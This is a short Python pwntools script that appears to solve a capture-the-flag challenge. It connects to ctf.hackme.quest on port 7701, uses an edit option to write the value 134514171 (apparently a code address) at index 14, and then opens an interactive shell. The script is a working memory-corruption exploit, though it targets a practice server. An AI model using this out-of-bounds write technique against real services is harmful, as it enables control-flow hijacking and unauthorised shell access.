from pwn import *
import pwn


def main():
    r = pwn.remote('ctf.hackme.quest', 7701)
    r.recvuntil(b'name? ')
    r.sendline(b'haha')
    r.recvuntil(b'numbers\n')
    r.recvuntil(b'> ')
    r.sendline(b'1')
    r.recvuntil(b'edit: ')
    r.sendline(b'14')
    r.recvuntil(b'many? ')
    r.sendline(b'134514171')
    r.recvuntil(b'numbers\n')
    r.recvuntil(b'> ')
    r.sendline(b'0')
    r.interactive()


if __name__ == '__main__':
    main()